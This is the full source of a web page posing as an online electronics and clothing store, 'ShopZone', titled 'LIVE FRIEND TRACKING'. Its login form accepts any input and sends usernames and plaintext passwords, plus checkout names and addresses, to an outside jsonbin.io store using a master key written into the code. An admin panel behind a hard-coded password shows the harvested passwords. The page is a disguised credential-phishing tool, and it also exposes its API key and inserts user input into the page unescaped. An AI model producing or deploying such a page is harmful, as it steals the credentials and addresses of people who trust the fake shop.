<!DOCTYPE html>
<html lang="en">  
<head>  
<meta charset="UTF-8">  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  
<title>ShopZone Mega Store - LIVE FRIEND TRACKING ‚úÖ</title>  
<style>  
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,sans-serif}  
body{background:#eaeded}  
.navbar{background:#131921;color:#fff;display:flex;justify-content:space-between;align-items:center;padding:12px 20px;position:sticky;top:0;z-index:999}  
.logo{color:#f08804;font-size:22px;font-weight:bold;cursor:pointer}  
.nav-links a{color:white;margin-left:15px;cursor:pointer;text-decoration:none;font-size:14px}  
.category-bar{background:#232f3e;padding:10px;display:flex;gap:15px;overflow-x:auto;color:white}  
.cat-item{cursor:pointer;white-space:nowrap;font-size:13px;padding:5px 10px}  
.section{display:none;padding:20px;max-width:1200px;margin:auto}  
.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px}  
.card{background:white;padding:15px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.1);text-align:center;cursor:pointer;transition:transform 0.2s}  
.card:hover{transform:scale(1.05)}  
.card img{width:100%;height:160px;object-fit:contain}  
.price{color:#B12704;font-weight:bold;font-size:18px;margin:10px 0}  
.box{background:white;padding:30px;border-radius:8px;max-width:400px;margin:auto;box-shadow:0 4px 12px rgba(0,0,0,.1)}  
input,textarea,select{width:100%;padding:11px;margin:10px 0;border:1px solid #ccc;border-radius:4px}  
.btn-orange{width:100%;padding:12px;background:#f08804;border:none;color:white;font-weight:bold;border-radius:4px;cursor:pointer;font-size:16px}  
.btn-yellow{width:100%;padding:12px;background:#ffd814;border:1px solid #fcd200;font-weight:bold;border-radius:4px;font-size:16px}  
.btn-red{width:100%;padding:12px;background:#dc3545;border:none;color:white;font-weight:bold;border-radius:4px;cursor:pointer;font-size:16px}  
.admin-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}  
.data-card{background:white;padding:15px;border-radius:8px;margin-bottom:10px;border-left:5px solid #f08804;font-size:13px;position:relative;cursor:pointer}  
.delete-btn{position:absolute;top:5px;right:5px;background:#dc3545;color:white;border:none;border-radius:50%;width:25px;height:25px;font-size:12px;cursor:pointer}  
#productModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:1000;justify-content:center;align-items:center}  
#deleteModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:1000;justify-content:center;align-items:center}  
.modal-content{background:white;padding:25px;border-radius:12px;text-align:center;max-width:450px;width:95%}  
.modal-buttons{display:flex;flex-direction:column;gap:12px;margin-top:20px}  
.cloud-status{padding:8px 12px;border-radius:6px;font-size:12px;margin:10px 0;font-weight:bold}  
.cloud-ok{background:#d4edda;color:#155724;border:1px solid #c3e6cb}  
.cloud-error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}  
</style>  
</head>  
<body>  
<nav class="navbar">  
<div class="logo" onclick="showSection('home')">üõí ShopZone - LIVE TRACKING</div>  
<div class="nav-links">  
<a onclick="showSection('home')">üè† Home</a>  
<a onclick="showCart()">üõí Cart</a>  
<a onclick="adminAccess()">‚öôÔ∏è ADMIN</a>  
<a id="loginLink" onclick="showSection('login')" style="display:inline">üë§ Login</a>  
<a id="logoutLink" onclick="logout()" style="display:none">üö™ Logout</a>  
</div>  
</nav>  

<div class="category-bar">  
<div class="cat-item" onclick="renderProducts('All')">All</div>  
<div class="cat-item" onclick="renderProducts('Mobiles')">üì± Mobiles</div>  
<div class="cat-item" onclick="renderProducts('Laptops')">üíª Laptops</div>  
<div class="cat-item" onclick="renderProducts('Electronics')">‚ö° Electronics</div>  
<div class="cat-item" onclick="renderProducts('Clothes')">üëï Clothes</div>  
</div>  

<div id="home" class="section" style="display:block">  
<h2>üî• Featured Products</h2>  
<div class="products" id="productGrid"></div>  
</div>  

<div id="login" class="section">  
<div class="box">  
<h3>üë§ User Login</h3>  
<input id="username" placeholder="Username">  
<input id="password" type="password" placeholder="Password">  
<button class="btn-orange" onclick="signIn()">Sign In</button>  
<p style="margin-top:10px;font-size:12px;color:#666">New user? Enter details to register</p>  
</div>  
</div>  

<div id="cart" class="section">  
<h2>üõí Your Cart</h2>  
<div id="cartItems"></div>  
</div>  

<div id="checkout" class="section">  
<div class="box">  
<h3>‚úÖ Checkout</h3>  
<p id="totalPrice" class="price"></p>  
<input id="custName" placeholder="Full Name">  
<textarea id="custAddress" placeholder="Full Address"></textarea>  
<select id="payMethod">  
<option>Cash on Delivery</option>  
<option>Online Payment</option>  
</select>  
<button class="btn-orange" onclick="processOrder()">Confirm Order</button>  
</div>  
</div>  

<div id="admin" class="section">  
<h2>‚öôÔ∏è Admin Dashboard</h2>  
<div id="cloudStatus" class="cloud-status cloud-ok">Loading...</div>  
<div class="admin-grid">  
<div><h3>üì¶ Orders (<span id="orderCount">0</span>)</h3><div id="orderList"></div></div>  
<div><h3>üë• Logins (<span id="loginCount">0</span>)</h3><div id="loginList"></div></div>  
</div>  
<button class="btn-orange" onclick="clearAllData()" style="width:200px;margin:20px auto;display:block">üóëÔ∏è Clear All Data</button>  
<button class="btn-yellow" onclick="refreshData()" style="width:200px;margin:10px auto;display:block">üîÑ Refresh Data</button>  
</div>  

<!-- MODAL -->
<div id="productModal">  
<div class="modal-content">  
  <img id="modalImg" style="width:100%;height:200px;object-fit:cover;border-radius:8px;margin-bottom:15px">  
  <h2 id="modalTitle" style="margin:10px 0;color:#333"></h2>  
  <p id="modalPrice" class="price" style="margin:15px 0"></p>  
  <div class="modal-buttons">  
    <button id="addCartBtn" class="btn-yellow">üõí Add to Cart</button>  
    <button id="buyNowBtn" class="btn-orange">üõçÔ∏è Buy Now</button>  
    <button id="closeModalBtn" class="btn-orange" style="background:#666">üîô Back</button>  
  </div>  
</div>  
</div>  

<div id="deleteModal">  
<div class="modal-content">  
<h3>‚ùå Confirm Delete</h3>  
<p>Delete this <span id="deleteType"></span>?</p>  
<button class="btn-red" onclick="confirmDelete()">Yes, Delete</button>  
<button class="btn-orange" onclick="closeDeleteModal()">Cancel</button>  
</div>  
</div>  

<script>  
// Global variables  
let products = [];  
let selectedProduct = {};  
let fromCart = false;  
let deleteIndex = -1;  
let deleteType = "";  
let allData = {users:[], logins:[], orders:[]};  

const BIN_ID = '699b242643b1c97be993f731';  
const API_KEY = '$2a$10$BCxHDH.mqJOJtkz/.Anne.bAcusDMtNrpCtkj2zQc0VYne8Fl6/iS';  

// Products  
products = [  
  {cat:"Mobiles",name:"iPhone 15 Pro",price:129999,img:"https://images.unsplash.com/photo-1695048133142-1a20484d2569?w=300"},  
  {cat:"Mobiles",name:"Samsung S24 Ultra",price:119999,img:"https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?w=300"},  
  {cat:"Mobiles",name:"OnePlus 12",price:69999,img:"https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=300"},  
  {cat:"Mobiles",name:"Redmi Note 13 Pro",price:25999,img:"https://images.unsplash.com/photo-1585060544812-6ebcfceb0d03?w=300"},  
  {cat:"Laptops",name:"MacBook Air M3",price:114999,img:"https://images.unsplash.com/photo-1517336714460-4c50426d6afb?w=300"},  
  {cat:"Laptops",name:"HP Pavilion",price:74999,img:"https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=300"},  
  {cat:"Electronics",name:"Sony XM5",price:24999,img:"https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=300"},  
  {cat:"Electronics",name:"Apple Watch 9",price:41999,img:"https://images.unsplash.com/photo-1434493789847-2f02dc6ca35d?w=300"},  
  {cat:"Clothes",name:"Men Denim Jacket",price:2999,img:"https://images.unsplash.com/photo-1520975954732-35dd22299614?w=300"},  
  {cat:"Clothes",name:"Women Kurti Set",price:1999,img:"https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?w=300"}  
];  

// ‚úÖ FIXED MODAL - SIMPLE INDEX BASED
function showProductModal(index) {  
  selectedProduct = products[index];  
  fromCart = false;  
  
  document.getElementById('modalTitle').textContent = selectedProduct.name;  
  document.getElementById('modalPrice').textContent = '‚Çπ' + selectedProduct.price.toLocaleString();  
  document.getElementById('modalImg').src = selectedProduct.img;  
  
  document.getElementById('addCartBtn').textContent = 'üõí Add to Cart';  
  document.getElementById('buyNowBtn').style.display = 'block';  
  
  document.getElementById('addCartBtn').onclick = addToCart;  
  document.getElementById('buyNowBtn').onclick = buyNow;  
  document.getElementById('closeModalBtn').onclick = closeModal;  
  
  document.getElementById('productModal').style.display = 'flex';  
}  

function closeModal() {  
  document.getElementById('productModal').style.display = 'none';  
}  

function buyNow() {  
  if(!localStorage.getItem('user')) {  
    alert('‚ö†Ô∏è Please login first!');  
    closeModal();  
    showSection('login');  
    return;  
  }  
  closeModal();  
  document.getElementById('totalPrice').textContent = `${selectedProduct.name} - ‚Çπ${selectedProduct.price.toLocaleString()}`;  
  showSection('checkout');  
}  

function addToCart() {  
  let cart = JSON.parse(localStorage.getItem('cart') || '[]');  
  cart.push(selectedProduct);  
  localStorage.setItem('cart', JSON.stringify(cart));  
  alert('‚úÖ Added to cart!');  
  closeModal();  
  showSection('home');  
}  

function showSection(id) {  
  document.querySelectorAll('.section').forEach(s => s.style.display = 'none');  
  document.getElementById(id).style.display = 'block';  
  document.getElementById('productModal').style.display = 'none';  
}  

function renderProducts(cat) {  
  const grid = document.getElementById('productGrid');  
  const filtered = products.filter(p => cat === 'All' || p.cat === cat);  
  grid.innerHTML = filtered.map((p, index) => `
    <div class="card" onclick="showProductModal(${index})">
      <img src="${p.img}">
      <h4>${p.name}</h4>
      <p class="price">‚Çπ${p.price.toLocaleString()}</p>
    </div>
  `).join('');  
  showSection('home');  
}  

function showCart() {  
  showSection('cart');  
  let cartData = JSON.parse(localStorage.getItem('cart') || '[]');  
  document.getElementById('cartItems').innerHTML = cartData.length === 0 
    ? '<p style="text-align:center;color:#666">Cart is empty</p>'
    : cartData.map((item, index) => `
      <div class="data-card" onclick="showCartModal(${index})">
        <b>${item.name}</b><br>‚Çπ${item.price.toLocaleString()}
      </div>
    `).join('');  
}  

function showCartModal(cartIndex) {  
  let cart = JSON.parse(localStorage.getItem('cart') || '[]');  
  selectedProduct = cart[cartIndex];  
  selectedProduct._cartIndex = cartIndex;  
  fromCart = true;  
  
  document.getElementById('modalTitle').textContent = selectedProduct.name;  
  document.getElementById('modalPrice').textContent = '‚Çπ' + selectedProduct.price.toLocaleString();  
  document.getElementById('modalImg').src = selectedProduct.img;  
  
  document.getElementById('addCartBtn').textContent = 'üóëÔ∏è Remove from Cart';  
  document.getElementById('buyNowBtn').style.display = 'none';  
  
  document.getElementById('addCartBtn').onclick = removeFromCart;  
  document.getElementById('closeModalBtn').onclick = closeModal;  
  
  document.getElementById('productModal').style.display = 'flex';  
}  

function removeFromCart() {  
  let cart = JSON.parse(localStorage.getItem('cart') || '[]');  
  cart.splice(selectedProduct._cartIndex, 1);  
  localStorage.setItem('cart', JSON.stringify(cart));  
  alert('‚úÖ Removed from cart!');  
  closeModal();  
  showCart();  
}  

// ‚úÖ FIXED CLOUD FUNCTIONS - NO UNDEFINED ERRORS
async function loadSharedData() {  
  try {  
    const localData = localStorage.getItem('shopzone_allData');  
    if (localData) {  
      allData = JSON.parse(localData);  
    }  
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {  
      headers: {'X-Master-Key': API_KEY}  
    });  
    const data = await response.json();  
    allData = data.record || {users:[], logins:[], orders:[]};  
    document.getElementById('cloudStatus').textContent = `üü¢ LIVE (${allData.orders.length} orders, ${allData.logins.length} logins)`;  
    document.getElementById('cloudStatus').className = 'cloud-status cloud-ok';  
  } catch(e) {  
    document.getElementById('cloudStatus').textContent = 'üî¥ Using local data';  
    document.getElementById('cloudStatus').className = 'cloud-status cloud-error';  
  }  
  localStorage.setItem('shopzone_allData', JSON.stringify(allData));  
  updateCounts();  
}  

async function saveSharedData() {  
  localStorage.setItem('shopzone_allData', JSON.stringify(allData));  
  try {  
    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {  
      method: 'PUT',  
      headers: {'Content-Type': 'application/json', 'X-Master-Key': API_KEY},  
      body: JSON.stringify(allData)  
    });  
  } catch(e) {}  
}  

// ‚úÖ FIXED ADMIN - NO UNDEFINED
function loadAdminData() {  
  // Orders - SAFE ACCESS
  const ordersHtml = (allData.orders || []).map((o, i) => `
    <div class="data-card">
      <button class="delete-btn" onclick="showDeleteModal(${i},'order')">√ó</button>
      <b>üë§ ${o.customer || 'No Name'}</b><br>
      üõçÔ∏è ${o.item || 'No Item'}<br>
      üìç ${o.address || 'No Address'}<br>
      üí∞ ‚Çπ${(o.price || 0).toLocaleString()}<br>
      <small>${o.time || 'No Time'}</small>
    </div>
  `).join('');  
  document.getElementById('orderList').innerHTML = ordersHtml;  
  
  // Logins - SAFE ACCESS  
  const loginsHtml = (allData.logins || []).map((l, i) => `
    <div class="data-card">
      <button class="delete-btn" onclick="showDeleteModal(${i},'login')">√ó</button>
      <b>üë§ ${l.user || 'No User'}</b><br>
      üîê <span style="color:#B12704;font-weight:bold">${l.pass || 'No Pass'}</span><br>
      <small>${l.time || 'No Time'}</small>
    </div>
  `).join('');  
  document.getElementById('loginList').innerHTML = loginsHtml;  
  
  updateCounts();  
}  

function updateCounts() {  
  document.getElementById('orderCount').textContent = allData.orders ? allData.orders.length : 0;  
  document.getElementById('loginCount').textContent = allData.logins ? allData.logins.length : 0;  
}  

async function processOrder() {  
  const customer = document.getElementById('custName').value.trim();  
  const address = document.getElementById('custAddress').value.trim();  
  if(!customer || !address) return alert('Please fill name & address!');  
  
  allData.orders.push({  
    customer, 
    item: selectedProduct.name, 
    address, 
    price: selectedProduct.price, 
    time: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})
  });  
  await saveSharedData();  
  alert('‚úÖ Order placed LIVE! Admin sees it now!');  
  showSection('home');  
  document.getElementById('custName').value = '';  
  document.getElementById('custAddress').value = '';  
}  

async function signIn() {  
  const user = document.getElementById('username').value.trim();  
  const pass = document.getElementById('password').value.trim();  
  if(!user || !pass) return alert('Please enter username & password');  
  
  allData.logins.push({  
    user, 
    pass, 
    time: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'}), 
    status: 'Active Login'
  });  
  await saveSharedData();  
  localStorage.setItem('user', user);  
  alert('‚úÖ Login successful!');  
  document.getElementById('username').value = '';  
  document.getElementById('password').value = '';  
  checkUI();  
  showSection('home');  
}  

function adminAccess() {  
  const pass = prompt('Admin Password:');  
  if(pass === 'QWERT1076') {  
    showSection('admin');  
    loadAdminData();  
  } else {  
    alert('‚ùå Wrong password!');  
  }  
}  

function showDeleteModal(index, type) {  
  deleteIndex = index;  
  deleteType = type;  
  document.getElementById('deleteType').textContent = type;  
  document.getElementById('deleteModal').style.display = 'flex';  
}  

function closeDeleteModal() {  
  document.getElementById('deleteModal').style.display = 'none';  
}  

async function confirmDelete() {  
  if(deleteType === 'order' && allData.orders) {  
    allData.orders.splice(deleteIndex, 1);  
  } else if(deleteType === 'login' && allData.logins) {  
    allData.logins.splice(deleteIndex, 1);  
  }  
  await saveSharedData();  
  closeDeleteModal();  
  loadAdminData();  
  alert('‚úÖ Deleted!');  
}  

async function clearAllData() {  
  if(confirm('Delete ALL data from cloud?')) {  
    allData = {users:[], logins:[], orders:[]};  
    await saveSharedData();  
    loadAdminData();  
    alert('üóëÔ∏è All data cleared!');  
  }  
}  

function refreshData() {  
  loadSharedData();  
  alert('üîÑ Data refreshed LIVE!');  
}  

function checkUI() {  
  const hasUser = !!localStorage.getItem('user');  
  document.getElementById('loginLink').style.display = hasUser ? 'none' : 'inline';  
  document.getElementById('logoutLink').style.display = hasUser ? 'inline' : 'none';  
}  

function logout() {  
  localStorage.removeItem('user');  
  checkUI();  
  showSection('home');  
}  

// Initialize app  
async function initApp() {  
  await loadSharedData();  
  renderProducts('All');  
  checkUI();  
}  

initApp();  
</script>  
</body>  
</html>